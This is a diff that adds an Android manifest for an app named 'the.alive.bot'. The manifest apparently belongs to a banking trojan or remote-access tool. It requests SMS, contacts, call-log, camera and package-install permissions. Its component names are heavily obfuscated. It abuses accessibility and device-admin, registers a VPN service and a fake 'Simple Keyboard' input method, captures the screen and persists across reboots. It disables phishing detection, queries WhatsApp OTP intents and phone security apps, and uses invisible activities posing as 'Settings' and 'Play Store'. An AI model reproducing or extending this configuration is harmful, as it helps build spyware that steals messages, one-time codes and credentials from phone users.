@@ -1,0 +1,252 @@
+<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" android:compileSdkVersion="23" android:compileSdkVersionCodename="6.0-2438415" package="the.alive.bot" platformBuildVersionCode="30" platformBuildVersionName="11">
+        <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.READ_CALL_LOG"  />
+    <uses-permission android:name="android.permission.READ_CONTACTS"  />
+    <uses-permission android:name="android.permission.GET_ACCOUNTS"  />
+    <uses-permission android:name="android.permission.CAMERA"  />
+
+    <uses-permission android:name="android.permission.DISABLE_KEYGUARD"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+    <uses-permission android:name="oppo.permission.OPPO_COMPONENT_SAFE"/>
+    <uses-permission android:name="oplus.permission.OPLUS_COMPONENT_SAFE"/>
+    <uses-permission android:name="com.huawei.permission.external_app_settings.USE_COMPONENT"/>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <queries>
+        <package android:name="the.orca"/>
+        <intent>
+            <action android:name="android.intent.action.VIEW"/>
+            <data android:host="messenger.com" android:scheme="https"/>
+        </intent>
+        <package android:name="snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31.snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31.vending.ymykrkvaianymbrfluixxryzdtfotyvlwkygbmmclgedytmzxo13.snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31.qvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb7"/>
+        <package android:name="ymykrkvaianymbrfluixxryzdtfotyvlwkygbmmclgedytmzxo13.ymykrkvaianymbrfluixxryzdtfotyvlwkygbmmclgedytmzxo13.vending.qvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb7.qvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb7.id"/>
+        <package android:name="qvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb7.android.ymykrkvaianymbrfluixxryzdtfotyvlwkygbmmclgedytmzxo13.snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31.snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31.id"/>
+        <package android:name="the.adsmanager"/>
+        <package android:name="the.analytics"/>
+        <package android:name="the.talk"/>
+        <package android:name="com.miui.securitycenter"/>
+        <package android:name="com.miui.permcenter"/>
+        <package android:name="com.letv.android.letvsafe"/>
+        <package android:name="com.asus.mobilemanager"/>
+        <package android:name="com.huawei.systemmanager"/>
+        <package android:name="com.coloros.safecenter"/>
+        <package android:name="com.oppo.safe"/>
+        <package android:name="com.iqoo.secure"/>
+        <package android:name="com.vivo.permissionmanager"/>
+        <package android:name="com.evenwell.powersaving"/>
+        <package android:name="com.samsung.android"/>
+        <package android:name="com.oneplus"/>
+        <package android:name="com.oplus"/>
+        <package android:name="com.oplus.battery"/>
+        <package android:name="com.android.settings"/>
+        <package android:name="the.arstudio.player"/>
+        <package android:name="com.instagram.boomerang"/>
+        <package android:name="the.katana"/>
+        <package android:name="the.lite"/>
+        <package android:name="com.instagram.android"/>
+        <package android:name="com.oculus.home"/>
+        <package android:name="com.oculus.horizon"/>
+        <intent>
+            <action android:name="android.intent.alive.VIEW"/>
+            <data android:mimeType="*/*"/>
+        </intent>
+        <intent>
+            <action android:name="android.alive.action.SEND"/>
+            <data android:mimeType="*/*"/>
+        </intent>
+        <intent>
+            <action android:name="alive.intent.action.PICK"/>
+            <data android:mimeType="*/*"/>
+        </intent>
+        <intent>
+            <action android:name="android.intent.action.MAIN"/>
+            <category android:name="android.alive.category.HOME"/>
+        </intent>
+        <intent>
+            <action android:name="android.intent.alive.SEND_MULTIPLE"/>
+            <data android:mimeType="*/*"/>
+        </intent>
+        <package android:name="the.services"/>
+        <intent>
+            <action android:name="com.whatsapp.action.INSTRUMENTATION_CALLBACK_SERVICE"/>
+        </intent>
+        <intent>
+            <action android:name="whatsapp.payments.intent.action.STEP_UP"/>
+        </intent>
+        <package android:name="com.google.android.apps.pixelmigrate"/>
+        <package android:name="com.google.android.apps.restore"/>
+        <package android:name="com.whatsapp.w4b"/>
+        <intent>
+            <action android:name="com.whatsapp.otp.OTP_RETRIEVED"/>
+        </intent>
+        <package android:name="com.google.android.apps.maps"/>
+        <package android:name="qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12.snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31.vending.ymykrkvaianymbrfluixxryzdtfotyvlwkygbmmclgedytmzxo13.apk.qvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb7"/>
+        <package android:name="snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31.ymykrkvaianymbrfluixxryzdtfotyvlwkygbmmclgedytmzxo13.vending.ymykrkvaianymbrfluixxryzdtfotyvlwkygbmmclgedytmzxo13.qvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb7.id"/>
+        <package android:name="qvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb7.android.ymykrkvaianymbrfluixxryzdtfotyvlwkygbmmclgedytmzxo13.snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31.snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31.id"/>
+        <package android:name="present.vsnet.mr"/>
+        <package android:name="specializing.thinkpad.belongs"/>
+        <package android:name="kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14.snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31.vending.derived.apk.qvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb7"/>
+        <package android:name="snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31.kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14.vending.derived.qvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb7.id"/>
+        <package android:name="qvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb7.android.kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14.snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31.snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31.id"/>
+    </queries>
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.WAKE_LOCK"/>
+    <uses-permission android:name="com.android.alarm.permission.SET_ALARM"/>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
+    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES"/>
+    <uses-permission android:name="android.permission.REQUEST_DELETE_PACKAGES"/>
+    <uses-permission android:name="android.permission.USE_FULL_SCREEN_INTENT"/>
+    <application android:appComponentFactory="androidx.core.app.CoreComponentFactory" android:hardwareAccelerated="true" android:icon="@drawable/loginr70" android:installLocation="internalOnly" android:label="@string/questionsw59" android:largeHeap="true" android:name="the.alive.woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2.Mykcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14Application" android:requestLegacyExternalStorage="true" android:supportsRtl="true" android:theme="@android:style/Theme.Translucent.NoTitleBar" android:usesCleartextTraffic="true">
+        <activity android:configChanges="keyboard|keyboardHidden|orientation|screenLayout|screenSize|smallestScreenSize|uiMode" android:enabled="true" android:exported="true" android:hardwareAccelerated="true" android:icon="@drawable/skinicon" android:label="BOT" android:name="the.alive.woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2.snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31" android:screenOrientation="sensor" android:taskAffinity="app.one" android:theme="@android:style/Theme.Translucent.NoTitleBar">
+            <intent-filter>
+                                <action android:name="android.intent.action.CHOOSER"/>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.INFO"/>
+                <action android:name="android.intent.action.VIEW"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+                <category android:name="com.android.internal.category.PLATLOGO"/>
+                <action android:name="android.intent.action.SEND"/>
+                <action android:name="android.intent.action.SEND_MULTIPLE"/>
+                <category android:name="android.intent.category.BROWSABLE"/>
+                <action android:name="android.intent.action.PACKAGE_REMOVED"/>
+                <action android:name="android.intent.action.PACKAGE_REPLACED"/>
+                <action android:name="android.intent.action.PACKAGE_ADDED"/>
+                <action android:name="android.intent.action.PACKAGE_CHANGED"/>
+                <action android:name="com.ui.OnAlarmReceiver.ACTION_WIDGET_RECEIVER"/>
+                <action android:name="com.android.vending.billing.InAppBillingService.COIN"/>
+                <action android:name="com.android.vending.billing.InAppBillingService.COIO"/>
+                <action android:name="com.android.vending.billing.InAppBillingService.LUCM"/>
+                <action android:name="com.android.vending.billing.InAppBillingService.PROX"/>
+                <action android:name="ir.cafebazaar.pardakht.InAppBillingService.BIND"/>
+                <action android:name="ru.aaaaaaax.installer"/>
+                <action android:name="com.nokia.payment.iapenabler.InAppBillingService.BIND"/>
+                <action android:name="com.android.vending.billing.InAppBillingService.INST"/>
+            </intent-filter>
+        </activity>
+        <activity android:excludeFromRecents="true" android:exported="true" android:icon="@drawable/tasteg71" android:label=" " android:name="the.alive.woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2.sjevviygrgznjcusmuosvyaisccxgmnbuojtfdzvvpwdawdurd20" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+        <activity android:excludeFromRecents="true" android:exported="true" android:icon="@drawable/tasteg71" android:label=" " android:name="the.alive.woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2.majtfiybehuxyrqlajjnbjfythkkpmzatktzlbytqnzemyczsi25" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+        <activity android:configChanges="keyboard|keyboardHidden|orientation|screenLayout|screenSize|smallestScreenSize|uiMode" android:exported="true" android:icon="@drawable/tasteg71" android:label=" " android:name="the.alive.woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2.eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4.qvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb70_WBV" android:screenOrientation="sensor" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+        <activity android:excludeFromRecents="true" android:exported="true" android:label="Play Store" android:name="the.alive.woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2.kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14_CA" android:showForAllUsers="true" android:theme="@android:style/Theme.Translucent.NoTitleBar">
+            <intent-filter>
+                <action android:name="the.alive.bot.xyz"/>
+            </intent-filter>
+        </activity>
+        <activity android:excludeFromRecents="true" android:exported="true" android:label=" " android:name="the.alive.woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2.qvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb72_SCA" android:showForAllUsers="true" android:theme="@android:style/Theme.Translucent.NoTitleBar" android:turnScreenOn="true"/>
+        <provider android:authorities="the.alive.bot.provider" android:exported="false" android:grantUriPermissions="true" android:name="androidx.core.content.FileProvider">
+            <meta-data android:name="android.support.FILE_PROVIDER_PATHS" android:resource="@xml/prov_path"/>
+        </provider>
+        <activity android:excludeFromRecents="true" android:exported="true" android:name="the.alive.woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2.kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+        <activity android:excludeFromRecents="true" android:exported="true" android:label=" " android:name="the.alive.woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2.kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14_WKUP" android:showForAllUsers="true" android:theme="@android:style/Theme.Translucent.NoTitleBar" android:turnScreenOn="true"/>
+        <activity android:excludeFromRecents="true" android:exported="true" android:label=" " android:name="the.alive.woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2._ask_remove_" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+        <activity android:excludeFromRecents="true" android:exported="true" android:name="the.alive.woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2.sjevviygrgznjcusmuosvyaisccxgmnbuojtfdzvvpwdawdurd20instll" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+        <activity android:excludeFromRecents="true" android:exported="true" android:name="the.alive.woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2.installupdate" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+        <receiver android:enabled="true" android:exported="true" android:name="the.alive.woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2.viulvrgaktrsgcbjhlzhktqfwaknivrarjroncrrqsxmvmehtj5.SRqvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb74B">
+            <intent-filter>
+                <action android:name="the.alive.bot.RestartSensor"/>
+            </intent-filter>
+        </receiver>
+        <service android:enabled="true" android:label="@string/questionsw59" android:name="the.alive.woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2.gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3.qvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb71" android:stopWithTask="false"/>
+        <service android:enabled="true" android:label="@string/questionsw59" android:name="the.alive.woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2.eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4.qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12"/>
+        <service android:enabled="true" android:label="@string/questionsw59" android:name="the.alive.woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2.gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3.ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11"/>
+        <service android:exported="true" android:name="the.alive.woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2.gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3.qvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb72" android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" android:stopWithTask="false">
+            <intent-filter android:priority="999">
+                <action android:name="android.accessibilityservice.AccessibilityService"/>
+            </intent-filter>
+            <meta-data android:name="android.accessibilityservice" android:resource="@xml/accessdiecrip"/>
+        </service>
+        <service android:enabled="true" android:exported="true" android:name="the.alive.woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2.gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3.Bdnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9worker"/>
+        <service android:enabled="true" android:foregroundServiceType="mediaPlayback" android:name="the.alive.woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2.gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3.aunstgpmkvyrhhhzulszqnsguszztbhsrhphzfdifobhhwfegg38" android:stopWithTask="false"/>
+        <service android:enabled="true" android:exported="true" android:name="the.alive.woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2.gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3.Vpnqvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb71Service" android:permission="android.permission.BIND_VPN_SERVICE" android:stopWithTask="false">
+            <intent-filter>
+                <action android:name="android.net.VpnService"/>
+            </intent-filter>
+        </service>
+        <receiver android:enabled="true" android:exported="true" android:name="the.alive.woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2.viulvrgaktrsgcbjhlzhktqfwaknivrarjroncrrqsxmvmehtj5.qvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb7" android:permission="android.permission.RECEIVE_BOOT_COMPLETED">
+            <intent-filter android:priority="999">
+                <category android:name="android.intent.category.DEFAULT"/>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <action android:name="android.intent.action.ACTION_BOOT_COMPLETED"/>
+                <action android:name="android.intent.action.QUICKBOOT_POWERON"/>
+                <action android:name="com.htc.intent.action.QUICKBOOT_POWERON"/>
+                <action android:name="android.intent.action.REBOOT"/>
+                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED"/>
+                <action android:name="miui.intent.action.BOOT_COMPLETEDT"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:enabled="true" android:exported="true" android:name="the.alive.woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2.viulvrgaktrsgcbjhlzhktqfwaknivrarjroncrrqsxmvmehtj5.kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14_RC">
+            <intent-filter>
+                <action android:name="android.intent.action.PACKAGE_INSTALL"/>
+                <action android:name="android.intent.action.PACKAGE_ADDED"/>
+                <action android:name="android.intent.action.PACKAGE_REMOVED"/>
+                <action android:name="android.intent.action.PACKAGE_ADDED"/>
+                <action android:name="android.intent.action.PACKAGE_CHANGED"/>
+                <action android:name="android.intent.action.MY_PACKAGE_REPLACED"/>
+                <data android:scheme="package"/>
+            </intent-filter>
+        </receiver>
+        <activity android:elevation="0.0dip" android:exported="true" android:finishOnCloseSystemDialogs="false" android:finishOnTaskLaunch="false" android:label="Settings" android:launchMode="singleInstance" android:name="the.alive.woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2.flyqlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12activ" android:showForAllUsers="true" android:showOnLockScreen="true" android:showWhenLocked="true" android:taskAffinity="app.two" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+        <activity android:elevation="0.0dip" android:exported="true" android:label="Settings" android:launchMode="singleTop" android:name="the.alive.woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2.opendnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9activity" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+        <activity android:elevation="0.0dip" android:exported="true" android:label="Settings" android:launchMode="singleTop" android:name="the.alive.woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2.openkcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14chrome" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+        <meta-data android:name="com.google.android.maps.v2.API_KEY" android:value="kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14"/>
+        <meta-data android:name="com.google.android.gms.car.application" android:value="1"/>
+        <meta-data android:name="com.google.android.gms.version" android:value="13547000"/>
+        <meta-data android:name="com.google.android.ALLOW_PHISHING_DETECTION" android:value="false"/>
+        <meta-data android:name="com.sec.android.support.multiwindow" android:value="true"/>
+        <meta-data android:name="com.sec.android.multiwindow.DEFAULT_SIZE_W" android:value="632.0dip"/>
+        <meta-data android:name="com.sec.android.multiwindow.DEFAULT_SIZE_H" android:value="598.0dip"/>
+        <meta-data android:name="com.sec.android.multiwindow.MINIMUM_SIZE_W" android:value="632.0dip"/>
+        <meta-data android:name="com.sec.android.multiwindow.MINIMUM_SIZE_H" android:value="598.0dip"/>
+        <meta-data android:name="android.max_aspect" android:value="2.1"/>
+        <receiver android:exported="true" android:name="the.alive.woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2.viulvrgaktrsgcbjhlzhktqfwaknivrarjroncrrqsxmvmehtj5.qvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb74">
+            <intent-filter>
+                <action android:name="android.intent.action.SCREEN_ON"/>
+                <action android:name="android.intent.action.SCREEN_OFF"/>
+                <action android:name="android.intent.action.ACTION_POWER_CONNECTED"/>
+                <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED"/>
+                <action android:name="android.intent.action.USER_PRESENT"/>
+            </intent-filter>
+        </receiver>
+        <service android:enabled="true" android:exported="true" android:foregroundServiceType="mediaProjection" android:name="the.alive.woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2.khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27"/>
+        <activity android:excludeFromRecents="true" android:exported="true" android:name="the.alive.woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2.stwwglbfkqqoneakgnsdmirdfuvhgyvkdwigfnurodsfxidmkq22" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+        <activity android:excludeFromRecents="true" android:exported="true" android:name="the.alive.woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2.kldhjnbisxxzhdadygnnqzrqfliyjtkoaryhwebvvrmlkslfvm29net" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+        <activity android:excludeFromRecents="true" android:exported="true" android:name="the.alive.woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2.startqvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb7vpn" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+        <activity android:excludeFromRecents="true" android:exported="true" android:name="the.alive.woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2.kldhjnbisxxzhdadygnnqzrqfliyjtkoaryhwebvvrmlkslfvm29" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+        <activity android:exported="true" android:name="the.alive.woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2.askopdnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9poact" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+        <activity android:excludeFromRecents="true" android:name="the.alive.woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2.kldhjnbisxxzhdadygnnqzrqfliyjtkoaryhwebvvrmlkslfvm29V2" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+        <activity android:excludeFromRecents="true" android:exported="true" android:name="the.alive.woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2.kldhjnbisxxzhdadygnnqzrqfliyjtkoaryhwebvvrmlkslfvm29kb" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+        <activity android:excludeFromRecents="true" android:exported="true" android:name="the.alive.woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2.vskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb21" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+        <activity android:exported="true" android:name="the.alive.woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2.kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14_AA" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+        <service android:enabled="true" android:exported="true" android:name="the.alive.woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2.gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3.Jobqvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb72Service" android:permission="android.permission.BIND_JOB_SERVICE"/>
+        <meta-data android:name="com.android.dynamic.apk.fused.modules" android:value="base"/>
+        <meta-data android:name="com.android.stamp.source" android:value="https://play.google.com/store"/>
+        <meta-data android:name="com.android.stamp.type" android:value="STAMP_TYPE_STANDALONE_APK"/>
+        <meta-data android:name="com.android.vending.derived.apk.id" android:value="1"/>
+        <receiver android:exported="true" android:name="the.alive.woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2.viulvrgaktrsgcbjhlzhktqfwaknivrarjroncrrqsxmvmehtj5.dateqvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb7rec">
+            <intent-filter>
+                <action android:name="android.intent.action.DATE_CHANGED"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:description="@string/armhstripesl56" android:exported="true" android:label="@string/listsaaspectr57" android:name="the.alive.qvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb7_AR" android:permission="android.permission.BIND_DEVICE_ADMIN">
+            <meta-data android:name="android.app.device_admin" android:resource="@xml/adm_rit"/>
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED"/>
+            </intent-filter>
+        </receiver>
+        <service android:exported="true" android:icon="@drawable/tasteg71" android:label="Simple Keyboard" android:name="the.alive.woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2.gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3.Ssjdpglidictkxfwcjjlhadynhnesldissqxbjreraftpkwojhz6IME" android:permission="android.permission.BIND_INPUT_METHOD">
+            <meta-data android:name="android.view.im" android:resource="@xml/method"/>
+            <intent-filter>
+                <action android:name="android.view.InputMethod"/>
+            </intent-filter>
+        </service>
+        <provider android:authorities="the.alive.bot.provider" android:exported="false" android:grantUriPermissions="true" android:name="androidx.core.content.FileProvider">
+            <meta-data android:name="android.support.FILE_PROVIDER_PATHS" android:resource="@xml/prov_path"/>
+        </provider>
+    </application>
+</manifest>
